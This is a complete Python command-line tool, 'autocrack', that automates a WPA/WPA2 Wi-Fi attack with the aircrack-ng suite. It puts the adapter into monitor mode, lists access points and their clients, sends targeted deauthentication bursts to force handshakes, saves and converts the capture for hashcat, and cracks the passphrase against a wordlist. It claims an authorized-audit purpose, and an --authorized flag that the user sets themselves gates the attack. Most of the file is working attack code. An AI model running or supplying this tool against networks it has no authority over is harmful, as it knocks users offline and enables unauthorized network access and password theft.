#!/usr/bin/env python3
"""autocrack — an automated aircrack-ng workflow for *authorized* Wi-Fi audits.

This chains the aircrack-ng suite end to end with no manual steps:

    airmon-ng  -> monitor mode
    airodump-ng-> discover access points (and pick the target you own)
    airodump-ng-> targeted capture, while
    aireplay-ng-> deauth bursts force a client to re-handshake
    aircrack-ng-> crack the captured WPA/WPA2 handshake against a wordlist

It is a thin, testable orchestrator around the real aircrack-ng binaries.
It runs on **Linux** (the MediaTek MT7610U / ALFA AWUS036ACHM has monitor
mode + injection via the in-kernel `mt76x0u` driver; macOS does not support
this) and must be run as root.

> Only run this against a network you own or are explicitly authorized to
> test. Deauthentication and handshake capture against networks you do not
> control are illegal in most jurisdictions. The `--authorized` flag is a
> deliberate speed bump, not a license.
"""

from __future__ import annotations

import argparse
import contextlib
import datetime
import os
import re
import shutil
import subprocess
import sys
import time
from dataclasses import dataclass
from pathlib import Path

REQUIRED_TOOLS = ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng")


class AutocrackError(RuntimeError):
    """Base error for autocrack failures."""


class AuthorizationError(AutocrackError):
    """Raised when the run was not explicitly authorized."""


class ToolNotFoundError(AutocrackError):
    """Raised when a required aircrack-ng binary is not on PATH."""


class NotRootError(AutocrackError):
    """Raised when the run is not executed as root (monitor mode needs it)."""


class InterfaceNotFoundError(AutocrackError):
    """Raised when the requested Wi-Fi interface does not exist."""


class MonitorModeError(AutocrackError):
    """Raised when monitor mode could not be enabled."""


@dataclass(frozen=True)
class AccessPoint:
    bssid: str
    channel: str
    privacy: str
    power: str
    essid: str


@dataclass(frozen=True)
class Station:
    """A client (station) seen by airodump-ng, and the AP it's associated to."""

    mac: str
    power: str
    packets: str
    bssid: str
    probes: str


@dataclass(frozen=True)
class AuditResult:
    bssid: str
    essid: str | None
    handshake_captured: bool
    key: str | None
    capture_path: str | None = None
    hashcat_path: str | None = None


# --- output parsing (pure, unit-tested) -----------------------------------


def parse_airodump_csv(text: str) -> list[AccessPoint]:
    """Parse an `airodump-ng --output-format csv` dump into access points.

    The CSV has two sections: access points, then a blank line and a
    "Station MAC" header for associated clients. Only the AP section is
    returned. Fields carry leading spaces and the file uses CRLF endings.
    """
    access_points: list[AccessPoint] = []
    for raw in text.splitlines():
        line = raw.strip()
        if not line:
            continue
        if line.startswith("BSSID,"):
            continue
        if line.startswith("Station MAC"):
            break  # stations follow; stop.
        fields = [field.strip() for field in line.split(",")]
        if len(fields) < 14 or not _looks_like_mac(fields[0]):
            continue
        access_points.append(
            AccessPoint(
                bssid=fields[0],
                channel=fields[3],
                privacy=fields[5],
                power=fields[8],
                essid=fields[13],
            )
        )
    return access_points


_MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")


def _looks_like_mac(value: str) -> bool:
    return bool(_MAC_RE.match(value))


def parse_airodump_stations(text: str, bssid: str | None = None) -> list[Station]:
    """Parse the station (client) section of an airodump-ng CSV dump.

    The section follows a blank line and a "Station MAC" header. Pass `bssid`
    to keep only clients associated to that access point (case-insensitive).
    """
    stations: list[Station] = []
    in_section = False
    for raw in text.splitlines():
        line = raw.strip()
        if not line:
            continue
        if line.startswith("Station MAC"):
            in_section = True
            continue
        if not in_section:
            continue
        fields = [field.strip() for field in line.split(",")]
        if len(fields) < 6 or not _looks_like_mac(fields[0]):
            continue
        station = Station(
            mac=fields[0],
            power=fields[3],
            packets=fields[4],
            bssid=fields[5],
            probes=fields[6] if len(fields) > 6 else "",
        )
        if bssid and station.bssid.lower() != bssid.lower():
            continue
        stations.append(station)
    return stations


_MONITOR_VIF_RE = re.compile(r"enabled for \[phy\d+\]\S+ on \[phy\d+\](?P<mon>\S+?)\)")


def parse_monitor_interface(airmon_output: str, requested: str) -> str:
    """Return the monitor interface airmon-ng created, or the requested one.

    Newer airmon-ng creates a separate `<iface>mon` vif and prints a line like
    "(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)".
    Some drivers instead switch the same interface into monitor mode in place,
    in which case we keep using the requested name.
    """
    match = _MONITOR_VIF_RE.search(airmon_output)
    if match:
        return match.group("mon")
    return requested


def parse_monitor_from_iw_dev(iw_output: str, prefer: str | None = None) -> str | None:
    """Return the interface that `iw dev` reports as being in monitor mode.

    This is the authoritative, driver-independent way to learn the monitor
    interface after `airmon-ng start` -- some drivers (mt76 / ALFA) switch the
    same interface in place (it stays `wlan1`), others create a `wlan1mon` vif.
    `prefer` (the requested interface) breaks ties. Returns None when nothing
    is in monitor mode.
    """
    monitors: list[str] = []
    current: str | None = None
    for raw in iw_output.splitlines():
        line = raw.strip()
        if line.startswith("Interface "):
            current = line.split(None, 1)[1].strip()
        elif line == "type monitor" and current:
            monitors.append(current)
    if not monitors:
        return None
    if prefer and prefer in monitors:
        return prefer
    if prefer:
        for name in monitors:
            if name.startswith(prefer) or prefer in name:
                return name
    return monitors[0]


def scan_has_handshake(aircrack_output: str, bssid: str) -> bool:
    """True when `aircrack-ng <cap>` reports a captured handshake for bssid.

    aircrack-ng lists each network with e.g. "WPA (1 handshake)". We match the
    row for our BSSID and require a non-zero handshake count.
    """
    bssid = bssid.lower()
    for line in aircrack_output.splitlines():
        if bssid not in line.lower():
            continue
        match = re.search(r"\((\d+)\s+handshake", line)
        if match and int(match.group(1)) > 0:
            return True
    return False


_KEY_FOUND_RE = re.compile(r"KEY FOUND!\s*\[\s*(?P<key>.*?)\s*\]")


def parse_crack_key(aircrack_output: str) -> str | None:
    """Return the passphrase from an aircrack-ng "KEY FOUND! [ ... ]" line."""
    match = _KEY_FOUND_RE.search(aircrack_output)
    return match.group("key") if match else None


def parse_hashcat_key(show_output: str) -> str | None:
    """Return the passphrase from `hashcat --show --outfile-format 2` output.

    Format 2 is the plain password, one per line; take the first non-empty one.
    """
    for line in show_output.splitlines():
        line = line.strip()
        if line:
            return line
    return None


# --- orchestration --------------------------------------------------------


class WifiAuditor:
    """Drives the aircrack-ng suite through the full automated pipeline.

    Every external command goes through the injected `runner`/`popen`, and
    waiting through `sleep`, so the orchestration is unit-testable without a
    live radio.
    """

    def __init__(
        self,
        interface: str,
        workdir: str,
        authorized: bool,
        runner=subprocess.run,
        popen=subprocess.Popen,
        sleep=time.sleep,
        euid_getter=os.geteuid,
        check_kill: bool = True,
        net_sysfs: str = "/sys/class/net",
        clock=time.monotonic,
        refresh: float = 1.0,
        captures_dir: str = "~/autocrack/captures",
        now=datetime.datetime.now,
    ) -> None:
        self.interface = interface
        self.workdir = Path(workdir)
        self.authorized = authorized
        self.check_kill = check_kill
        self._runner = runner
        self._popen = popen
        self._sleep = sleep
        self._euid_getter = euid_getter
        self._net_sysfs = Path(net_sysfs)
        self._clock = clock
        self._refresh = refresh
        self.captures_dir = Path(os.path.expanduser(captures_dir))
        self._now = now
        self.monitor: str | None = None

    def ensure_root(self) -> None:
        """Monitor mode, injection, and airmon-ng all require root."""
        if self._euid_getter() != 0:
            raise NotRootError("autocrack must be run as root (e.g. with sudo).")

    def preflight(self) -> None:
        """Ensure the aircrack-ng suite is installed and the interface exists."""
        for tool in REQUIRED_TOOLS:
            completed = self._runner(["which", tool], capture_output=True, text=True)
            if completed.returncode != 0:
                raise ToolNotFoundError(
                    f"'{tool}' not found on PATH. Install the aircrack-ng suite "
                    f"(e.g. `sudo apt install aircrack-ng`)."
                )
        # Only enforce on a system that exposes sysfs (Linux); a no-op elsewhere.
        if self._net_sysfs.exists() and not (self._net_sysfs / self.interface).exists():
            raise InterfaceNotFoundError(
                f"Interface '{self.interface}' not found. Plug in the adapter and "
                f"check `iw dev` — on a Raspberry Pi the ALFA is usually wlan1 "
                f"(wlan0 is the built-in Wi-Fi)."
            )

    def enable_monitor(self) -> str:
        if self.check_kill:
            # NetworkManager/wpa_supplicant fight airodump for the radio and
            # yank it off the target channel; airmon-ng check kill stops them.
            self._runner(["airmon-ng", "check", "kill"], capture_output=True, text=True)
        completed = self._runner(
            ["airmon-ng", "start", self.interface], capture_output=True, text=True
        )
        if completed.returncode != 0:
            detail = (completed.stderr or completed.stdout or "").strip()
            raise MonitorModeError(
                f"airmon-ng could not enable monitor mode on {self.interface}: {detail}"
            )
        self.monitor = self._detect_monitor_interface(completed.stdout)
        if not self.monitor:
            raise MonitorModeError(
                f"No interface entered monitor mode after airmon-ng start on "
                f"{self.interface} (check rfkill, or that the driver supports "
                f"monitor mode)."
            )
        return self.monitor

    def _detect_monitor_interface(self, airmon_stdout: str) -> str | None:
        """Find the monitor interface authoritatively via `iw dev`.

        Works whether the driver switched the card in place (name unchanged) or
        created a `…mon` vif. If `iw` isn't installed, fall back to parsing
        airmon-ng's own output.
        """
        try:
            info = self._runner(["iw", "dev"], capture_output=True, text=True)
        except FileNotFoundError:
            return parse_monitor_interface(airmon_stdout, requested=self.interface)
        return parse_monitor_from_iw_dev(info.stdout, prefer=self.interface)

    def disable_monitor(self) -> None:
        if self.monitor:
            self._runner(["airmon-ng", "stop", self.monitor], capture_output=True, text=True)
            self.monitor = None

    def scan(self, seconds: int = 15, on_update=None, stop=None) -> list[AccessPoint]:
        """Scan for nearby access points and parse the discovered APs.

        airodump-ng runs in the background writing its CSV; we re-read it every
        `refresh` seconds and, if `on_update(aps, elapsed, total)` is given,
        stream the growing list to a live display. Timed for `seconds` unless a
        `stop` predicate is given, in which case it scans continuously until
        `stop()` returns true (see `_run_airodump`).
        """
        cmd = [
            "airodump-ng",
            "--write", str(self.workdir / "scan"),
            "--output-format", "csv",
            self.monitor or self.interface,
        ]
        return self._run_airodump(
            cmd, self.workdir / "scan-01.csv", "scan", seconds, parse_airodump_csv,
            on_update, stop=stop,
        )

    def _scan_stations(self, bssid, channel, seconds, on_update, stop=None):
        """airodump-ng locked to one AP, parsing its associated clients. Timed
        for `seconds`, or continuous until `stop()` when a predicate is given."""
        cmd = [
            "airodump-ng",
            "--bssid", bssid,
            "--channel", channel,
            "--write", str(self.workdir / "clients"),
            "--output-format", "csv",
            self.monitor or self.interface,
        ]
        return self._run_airodump(
            cmd, self.workdir / "clients-01.csv", "clients", seconds,
            lambda text: parse_airodump_stations(text, bssid=bssid), on_update,
            stop=stop,
        )

    def _run_airodump(self, cmd, csv_path, prefix_key, seconds, parse, on_update,
                      stop=None):
        """Run airodump-ng in the background, re-parsing its CSV each `refresh`
        interval and streaming results to `on_update`.

        Timed by default: it runs for `seconds`, and each `on_update` reports
        `(result, elapsed, seconds)`. When a `stop` predicate is given it runs
        continuously instead — ignoring `seconds` and looping until `stop()`
        returns true — and reports `(result, elapsed, None)` so the display can
        show a "press SPACE to stop" prompt rather than a countdown.
        """
        self._clear_captures(prefix_key)
        # Detach airodump-ng from the terminal: it's interactive and would
        # otherwise swallow the keystrokes (and reset the tty mode) that our
        # spacebar-stop reader depends on for a continuous scan.
        dump = self._popen(
            cmd, stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        start = self._clock()
        total = None if stop is not None else seconds
        result: list = []
        try:
            while True:
                if stop is not None:
                    if stop():
                        break
                elif self._clock() - start >= seconds:
                    break
                self._sleep(self._refresh)
                result = self._parse_csv(csv_path, parse)
                if on_update is not None:
                    elapsed = int(self._clock() - start)
                    if stop is None:
                        elapsed = min(elapsed, seconds)
                    on_update(result, elapsed, total)
        finally:
            dump.terminate()
            try:
                dump.wait(timeout=5)
            except Exception:
                pass
        result = self._parse_csv(csv_path, parse)
        if on_update is not None:
            elapsed = seconds if stop is None else int(self._clock() - start)
            on_update(result, elapsed, total)
        return result

    def _parse_csv(self, csv_path: Path, parse):
        if not csv_path.exists():
            return []
        return parse(csv_path.read_text(errors="replace"))

    def discover_clients(
        self, scan_seconds: int = 15, bssid: str | None = None,
        channel: str | None = None, essid: str | None = None, on_update=None,
        stop=None,
    ):
        """Recon: list the clients associated to a specific AP you own.

        Give a BSSID (with its channel) or an ESSID (resolved via a quick scan).
        Returns (bssid, channel, stations). Passive: monitor + listen only, no
        deauth/capture. Requires root; tears monitor mode back down.
        """
        if bssid and not channel:
            raise AutocrackError("A channel is required with a BSSID for a client scan.")
        if not bssid and not essid:
            raise AutocrackError("Give a BSSID (+channel) or an ESSID to monitor clients.")
        self.ensure_root()
        self.preflight()
        self.enable_monitor()
        try:
            if not bssid:
                match = next((ap for ap in self.scan(seconds=scan_seconds) if ap.essid == essid), None)
                if match is None:
                    raise AutocrackError(f"ESSID {essid!r} was not seen in the scan.")
                bssid, channel = match.bssid, match.channel
            stations = self._scan_stations(
                bssid, channel, scan_seconds, on_update, stop=stop,
            )
            return bssid, channel, stations
        finally:
            self.disable_monitor()

    def capture_handshake(
        self,
        bssid: str,
        channel: str,
        deauth_rounds: int = 4,
        poll_seconds: int = 5,
        deauth_count: int = 5,
        essid: str | None = None,
        on_update=None,
    ) -> tuple[Path, bool]:
        """Capture a WPA handshake for bssid, nudging clients with deauths.

        Runs a targeted airodump-ng in the background, then alternates deauth
        bursts with handshake-presence checks until one is captured or the
        deauth rounds are exhausted. Returns the capture path and whether a
        handshake was seen. If `on_update(elapsed, done, total, captured)` is
        given, progress is streamed to a live display after each round.
        """
        self._clear_captures("handshake")
        prefix = self.workdir / "handshake"
        cap_path = self.workdir / "handshake-01.cap"
        csv_path = self.workdir / "handshake-01.csv"
        captured = False
        start = self._clock()
        dump = self._popen(
            [
                "airodump-ng",
                "--bssid", bssid,
                "--channel", channel,
                "--write", str(prefix),
                # pcap holds the handshake; csv is the live station table we
                # re-read each round to target the AP's associated clients.
                "--output-format", "pcap,csv",
                self.monitor or self.interface,
            ],
            stdin=subprocess.DEVNULL,  # keep airodump off our terminal
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        try:
            for round_index in range(deauth_rounds):
                self._deauth_round(bssid, csv_path, deauth_count)
                self._sleep(poll_seconds)
                captured = self._handshake_present(cap_path, bssid)
                if on_update is not None:
                    on_update(
                        bssid, essid, int(self._clock() - start),
                        round_index + 1, deauth_rounds, captured,
                    )
                if captured:
                    break
        finally:
            dump.terminate()
            try:
                dump.wait(timeout=5)
            except Exception:
                pass
        return cap_path, captured

    def _deauth_round(self, bssid: str, csv_path: Path, deauth_count: int) -> None:
        """Send one round of deauths to knock clients into re-handshaking.

        Prefers targeted deauths — one burst per station currently associated
        with the AP (per airodump's live csv), since many clients ignore
        broadcast deauth frames. Falls back to a single broadcast burst when no
        associated clients are visible yet (e.g. the csv hasn't populated, or
        nothing is connected).
        """
        iface = self.monitor or self.interface
        stations = self._associated_stations(csv_path, bssid)
        targets = [["-c", s.mac] for s in stations] or [[]]
        for target in targets:
            self._runner(
                ["aireplay-ng", "--deauth", str(deauth_count), "-a", bssid,
                 *target, iface],
                capture_output=True,
                text=True,
            )

    def _associated_stations(self, csv_path: Path, bssid: str) -> list[Station]:
        """Clients airodump currently shows associated to bssid (empty if none
        or the csv isn't there yet)."""
        try:
            text = csv_path.read_text(errors="replace")
        except OSError:
            return []
        return parse_airodump_stations(text, bssid=bssid)

    def _clear_captures(self, prefix: str) -> None:
        """Remove leftover files from a previous run so we never read stale
        scan results or a stale handshake as if they were this run's."""
        for stale in self.workdir.glob(f"{prefix}-*"):
            try:
                stale.unlink()
            except OSError:
                pass

    def _handshake_present(self, cap_path: Path, bssid: str) -> bool:
        completed = self._runner(
            ["aircrack-ng", str(cap_path)], capture_output=True, text=True
        )
        return scan_has_handshake(completed.stdout, bssid)

    def _archive_capture(self, cap_path: Path, bssid: str, essid: str | None):
        """Retain the handshake pcap under captures_dir and export it for hashcat.

        Returns (saved_cap_path, hashcat_path) as strings, either possibly None.
        The saved name is <essid>_<bssid>_<timestamp>.cap so runs never clobber
        each other. Does nothing if the source capture doesn't exist.
        """
        if not cap_path.exists():
            return None, None
        self.captures_dir.mkdir(parents=True, exist_ok=True)
        stamp = self._now().strftime("%Y%m%d-%H%M%S")
        safe_essid = re.sub(r"[^A-Za-z0-9._-]+", "_", essid or "unknown").strip("_") or "unknown"
        base = f"{safe_essid}_{bssid.replace(':', '-')}_{stamp}"
        saved = self.captures_dir / f"{base}.cap"
        shutil.copy2(cap_path, saved)
        return str(saved), self._export_hashcat(saved)

    def _export_hashcat(self, cap_path: Path) -> str | None:
        """Convert the capture's EAPOL handshake to hashcat 22000 format.

        Uses hcxpcapngtool (hcxtools). Returns the .hc22000 path, or None if the
        tool isn't installed or produced nothing (export is best-effort — the
        pcap is always kept regardless).
        """
        out = cap_path.with_suffix(".hc22000")
        try:
            completed = self._runner(
                ["hcxpcapngtool", "-o", str(out), str(cap_path)],
                capture_output=True,
                text=True,
            )
        except FileNotFoundError:
            return None
        if completed.returncode != 0 or not out.exists():
            return None
        return str(out)

    def crack(self, cap_path: Path, bssid: str, wordlist: str,
              hashcat_path: str | None = None) -> str | None:
        """Crack the captured handshake against `wordlist`.

        Prefers hashcat on the `.hc22000` export when one is available: it's far
        faster and its hcxtools-derived handshake is more robust than
        aircrack-ng's own pcap parsing, which can churn through an entire
        wordlist and miss a key that hashcat finds from the same capture. Falls
        back to `aircrack-ng` on the pcap only when there's no export or hashcat
        isn't installed. If hashcat ran and found nothing, we return no key
        rather than re-running the slower cracker over the same list.
        """
        if hashcat_path:
            try:
                return self._crack_hashcat(hashcat_path, wordlist)
            except FileNotFoundError:
                pass  # hashcat not installed; fall back to aircrack-ng
        return self._crack_aircrack(cap_path, bssid, wordlist)

    def _crack_hashcat(self, hashcat_path: str, wordlist: str) -> str | None:
        """Run hashcat (mode 22000) over the wordlist, then read back the key.

        Raises FileNotFoundError if hashcat isn't installed (so `crack` can fall
        back). stdin is detached so hashcat can't grab the terminal.
        """
        self._runner(
            ["hashcat", "-m", "22000", "--quiet", hashcat_path, wordlist],
            stdin=subprocess.DEVNULL, capture_output=True, text=True,
        )
        # --show reads the potfile, so it reports the key whether it was cracked
        # just now or on an earlier run.
        shown = self._runner(
            ["hashcat", "-m", "22000", "--show", "--outfile-format", "2", hashcat_path],
            stdin=subprocess.DEVNULL, capture_output=True, text=True,
        )
        return parse_hashcat_key(shown.stdout)

    def _crack_aircrack(self, cap_path: Path, bssid: str, wordlist: str) -> str | None:
        completed = self._runner(
            ["aircrack-ng", "-w", wordlist, "-b", bssid, str(cap_path)],
            capture_output=True,
            text=True,
        )
        return parse_crack_key(completed.stdout)

    def _resolve_target(
        self,
        bssid: str | None,
        channel: str | None,
        essid: str | None,
        scan_seconds: int,
        on_scan_update=None,
        verbose: bool = True,
    ) -> tuple[str, str, str | None]:
        """Return the (bssid, channel, essid) to attack, scanning if needed.

        Monitor mode must already be enabled (airodump can't scan a managed
        interface). Refuses to pick a target on its own when several APs are in
        range and none was named -- you choose what you're allowed to test.
        """
        if bssid:
            if not channel:
                raise AutocrackError("A channel is required when a BSSID is given.")
            return bssid, channel, essid

        if verbose:
            print(f"[*] Scanning {scan_seconds}s on {self.monitor or self.interface} ...", file=sys.stderr)
        access_points = self.scan(seconds=scan_seconds, on_update=on_scan_update)
        if not access_points:
            raise AutocrackError("No access points found. Move closer or scan longer.")
        if essid:
            for ap in access_points:
                if ap.essid == essid:
                    return ap.bssid, ap.channel, ap.essid
            raise AutocrackError(f"ESSID {essid!r} was not seen in the scan.")

        raise AutocrackError(
            "Several APs are in range; target one with a BSSID+channel or an "
            "ESSID you own (or use --scan-only to just list them):\n"
            + render_ap_list(access_points)
        )

    def discover(self, scan_seconds: int = 15, on_update=None, stop=None) -> list[AccessPoint]:
        """Recon only: enable monitor mode, scan, and return nearby APs.

        No target and no wordlist required, and no deauth/capture — this just
        listens for beacons. Still needs root (monitor mode) and tears the
        monitor interface back down afterwards.
        """
        self.ensure_root()
        self.preflight()
        self.enable_monitor()
        try:
            return self.scan(seconds=scan_seconds, on_update=on_update, stop=stop)
        finally:
            self.disable_monitor()

    def run(
        self,
        *,
        wordlist: str,
        bssid: str | None = None,
        channel: str | None = None,
        essid: str | None = None,
        deauth_rounds: int = 4,
        deauth_count: int = 5,
        scan_seconds: int = 15,
        on_scan_update=None,
        on_capture_update=None,
        verbose: bool = True,
    ) -> AuditResult:
        """Run the full automated pipeline against a single target you own.

        `verbose` prints one-line stage milestones to stderr; turn it off when a
        live display already shows progress, to avoid fighting its redraw.
        """
        if not self.authorized:
            raise AuthorizationError(
                "Refusing to run without explicit authorization. Pass --authorized "
                "only for a network you own or are permitted to test."
            )
        self.ensure_root()
        self.preflight()
        self.enable_monitor()
        try:
            bssid, channel, essid = self._resolve_target(
                bssid, channel, essid, scan_seconds,
                on_scan_update=on_scan_update, verbose=verbose,
            )
            if verbose:
                print(f"[*] Target {bssid} (ch {channel}) — capturing handshake ...", file=sys.stderr)
            cap_path, captured = self.capture_handshake(
                bssid, channel, deauth_rounds=deauth_rounds, deauth_count=deauth_count,
                essid=essid, on_update=on_capture_update,
            )
            saved_cap = hashcat_path = None
            if captured:
                saved_cap, hashcat_path = self._archive_capture(cap_path, bssid, essid)
            key = (
                self.crack(cap_path, bssid, wordlist, hashcat_path=hashcat_path)
                if captured else None
            )
        finally:
            self.disable_monitor()
        return AuditResult(
            bssid=bssid, essid=essid, handshake_captured=captured, key=key,
            capture_path=saved_cap, hashcat_path=hashcat_path,
        )


# --- live display ---------------------------------------------------------


def render_scan_table(access_points, elapsed, total) -> str:
    """Render a refreshing airodump-style AP table for the live display.

    `total` is the scan duration for a timed scan, or None for a continuous
    (spacebar-stopped) scan — the header then prompts for SPACE instead of
    counting down.
    """
    if total is None:
        header = (
            f"  Scanning… {elapsed}s — press SPACE to stop"
            f"      {len(access_points)} AP(s) found"
        )
    else:
        header = f"  Scanning… {elapsed}s / {total}s      {len(access_points)} AP(s) found"
    cols = f"  {'BSSID':<17}  {'CH':>3}  {'PWR':>4}  {'PRIVACY':<12} ESSID"
    if not access_points:
        return "\n".join([header, cols, "  (listening…)"])
    rows = [
        f"  {ap.bssid:<17}  {ap.channel:>3}  {ap.power:>4}  {ap.privacy:<12} {ap.essid}"
        for ap in access_points
    ]
    return "\n".join([header, cols, *rows])


def render_ap_list(access_points) -> str:
    """A plain, aligned table of discovered access points (for final output)."""
    header = f"  {'BSSID':<17}  {'CH':>3}  {'PWR':>4}  {'PRIVACY':<12} ESSID"
    rows = [
        f"  {ap.bssid:<17}  {ap.channel:>3}  {ap.power:>4}  {ap.privacy:<12} {ap.essid}"
        for ap in access_points
    ]
    return "\n".join([header, *rows])


def render_station_list(stations) -> str:
    """A table of associated clients (stations) for a monitored AP."""
    header = f"  {'STATION (client)':<19}  {'PWR':>4}  {'PKTS':>6}  {'ASSOCIATED BSSID':<19} PROBES"
    if not stations:
        return header + "\n  (no clients seen — try scanning longer)"
    rows = [
        f"  {s.mac:<19}  {s.power:>4}  {s.packets:>6}  {s.bssid:<19} {s.probes}"
        for s in stations
    ]
    return "\n".join([header, *rows])


def render_capture_status(bssid, essid, elapsed, done, total, captured) -> str:
    """Render the live handshake-capture status block."""
    target = f"{bssid} ({essid})" if essid else bssid
    state = "handshake captured ✓" if captured else "handshake: waiting…"
    return (
        f"  Capturing handshake — {target}\n"
        f"  elapsed {elapsed}s   deauth {done}/{total}   {state}"
    )


class LiveWriter:
    """Repaints a multi-line frame in place using ANSI cursor control.

    Disabled (no tty, or --quiet) it writes nothing, so piped/non-interactive
    runs stay clean and the plain stderr milestones carry the story instead.
    """

    def __init__(self, stream=None, enabled: bool = True) -> None:
        self._stream = stream if stream is not None else sys.stdout
        self._enabled = enabled
        self._lines = 0

    def update(self, text: str) -> None:
        if not self._enabled:
            return
        if self._lines:
            # Move up to the start of the previous frame and clear to end.
            self._stream.write(f"\033[{self._lines}F\033[J")
        self._stream.write(text + "\n")
        self._stream.flush()
        self._lines = text.count("\n") + 1

    def finish(self) -> None:
        """Leave the last frame in place; subsequent output starts below it."""
        self._lines = 0


@contextlib.contextmanager
def keypress_stop(key: str = " ", stream=None):
    """Yield a predicate that becomes true once `key` is pressed.

    Puts the terminal in cbreak mode so a single keypress is readable without
    Enter, and polls stdin without blocking so the caller keeps refreshing its
    display between checks. Restores the terminal on exit. Requires a real tty
    (a POSIX terminal); the caller decides when that's available.
    """
    import termios
    import tty
    import select

    stream = stream if stream is not None else sys.stdin
    fd = stream.fileno()
    old_attrs = termios.tcgetattr(fd)
    tty.setcbreak(fd)
    pressed = False

    def check() -> bool:
        nonlocal pressed
        if pressed:
            return True
        while select.select([stream], [], [], 0)[0]:
            ch = stream.read(1)
            if ch == "":  # EOF
                break
            if ch == key:
                pressed = True
                return True
        return False

    try:
        yield check
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_attrs)


@contextlib.contextmanager
def scan_stop(interactive: bool):
    """Yield a spacebar-stop predicate for a continuous scan when interactive,
    or None (a plain timed scan) when there's no usable terminal."""
    if not (interactive and sys.stdin.isatty()):
        yield None
        return
    try:
        cm = keypress_stop(" ")
        check = cm.__enter__()
    except Exception:
        # No raw-terminal access (e.g. redirected stdin); fall back to timed.
        yield None
        return
    try:
        yield check
    finally:
        cm.__exit__(None, None, None)


# --- CLI ------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="autocrack",
        description=(
            "Automated aircrack-ng workflow (monitor -> scan -> capture -> "
            "crack) for AUTHORIZED Wi-Fi audits on Linux."
        ),
    )
    parser.add_argument("--interface", required=True, help="Wi-Fi interface, e.g. wlan0")
    parser.add_argument("--wordlist", help="Path to a passphrase wordlist (required unless --scan-only)")
    parser.add_argument(
        "--scan-only",
        action="store_true",
        help="Just scan and list nearby APs, then exit (no target, no capture)",
    )
    parser.add_argument("--bssid", help="Target AP BSSID (skip interactive scan/select)")
    parser.add_argument("--channel", help="Target AP channel (required with --bssid)")
    parser.add_argument("--essid", help="Target AP ESSID (used to auto-resolve BSSID/channel)")
    parser.add_argument(
        "--scan-time", type=int, default=15,
        help="Scan duration in seconds for non-interactive/--quiet runs "
             "(an interactive --scan-only scan runs until you press SPACE); "
             "also the AP scan time on the attack path",
    )
    parser.add_argument("--deauth-rounds", type=int, default=4, help="Deauth/capture attempts")
    parser.add_argument(
        "--deauth-count", type=int, default=5,
        help="Deauth frames sent per round (aireplay-ng --deauth)",
    )
    parser.add_argument(
        "--workdir", default="/tmp/autocrack", help="Scratch directory for in-progress capture files"
    )
    parser.add_argument(
        "--captures-dir",
        default="~/autocrack/captures",
        help="Where to retain handshake pcaps and hashcat exports",
    )
    parser.add_argument(
        "--no-check-kill",
        action="store_true",
        help="Do not run `airmon-ng check kill` (leave NetworkManager running)",
    )
    parser.add_argument(
        "--quiet",
        action="store_true",
        help="Disable the live table/status display (print plain milestones only)",
    )
    parser.add_argument(
        "--authorized",
        action="store_true",
        help="Confirm you own or are permitted to test the target (required)",
    )
    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    auditor = WifiAuditor(
        interface=args.interface,
        workdir=args.workdir,
        authorized=args.authorized,
        check_kill=not args.no_check_kill,
        captures_dir=args.captures_dir,
    )

    live = (not args.quiet) and sys.stdout.isatty()
    display = LiveWriter(enabled=live)
    on_scan = lambda aps, elapsed, total: display.update(render_scan_table(aps, elapsed, total))
    on_capture = lambda b, e, elapsed, done, total, got: display.update(
        render_capture_status(b, e, elapsed, done, total, got)
    )
    def on_clients(sts, elapsed, total):
        table = render_station_list(sts)
        if total is None:  # continuous (spacebar-stopped) scan
            table = f"  Scanning clients… {elapsed}s — press SPACE to stop\n" + table
        display.update(table)

    # Recon mode: scan and list, then exit. No wordlist/auth needed.
    if args.scan_only:
        target = args.bssid or args.essid
        try:
            auditor.workdir.mkdir(parents=True, exist_ok=True)
            # Interactive recon scans run until SPACE is pressed; a non-tty or
            # --quiet run falls back to a fixed --scan-time duration.
            with scan_stop(live) as stop:
                if target:
                    # Monitor one AP and list its associated clients.
                    bssid, channel, stations = auditor.discover_clients(
                        scan_seconds=args.scan_time, bssid=args.bssid,
                        channel=args.channel, essid=args.essid,
                        on_update=on_clients, stop=stop,
                    )
                else:
                    aps = auditor.discover(
                        scan_seconds=args.scan_time, on_update=on_scan, stop=stop,
                    )
        except AutocrackError as exc:
            display.finish()
            print(f"[!] {exc}", file=sys.stderr)
            return 1
        finally:
            display.finish()

        if target:
            label = f"{bssid} (ch {channel})"
            print(f"[+] {len(stations)} client(s) associated to {label}:")
            print(render_station_list(stations))
            return 0
        if not aps:
            print("No access points found. Move closer or scan longer.")
            return 0
        print(f"[+] {len(aps)} access point(s) found:")
        print(render_ap_list(aps))
        return 0

    if not args.authorized:
        print(
            "[!] Refusing to run without --authorized. Only test networks you own "
            "or are explicitly permitted to test.",
            file=sys.stderr,
        )
        return 2
    if not args.wordlist:
        parser.error("--wordlist is required (unless --scan-only)")

    try:
        auditor.workdir.mkdir(parents=True, exist_ok=True)
        result = auditor.run(
            wordlist=args.wordlist,
            bssid=args.bssid,
            channel=args.channel,
            essid=args.essid,
            deauth_rounds=args.deauth_rounds,
            deauth_count=args.deauth_count,
            scan_seconds=args.scan_time,
            on_scan_update=on_scan,
            on_capture_update=on_capture,
            verbose=not live,
        )
    except AutocrackError as exc:
        display.finish()
        print(f"[!] {exc}", file=sys.stderr)
        return 1
    finally:
        display.finish()

    if not result.handshake_captured:
        print("[-] No handshake captured. Try more deauth rounds or a busier time.")
        return 1

    if result.capture_path:
        print(f"[+] Handshake saved: {result.capture_path}")
    if result.hashcat_path:
        print(f"[+] Hashcat (22000): {result.hashcat_path}")
    elif result.capture_path:
        print("    (install hcxtools for a hashcat .hc22000 export)")

    if result.key is None:
        print("[-] Handshake captured but passphrase not in wordlist "
              "(crack the saved capture later with a bigger list / hashcat).")
        return 1
    print(f"[+] KEY FOUND for {result.bssid}: {result.key}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
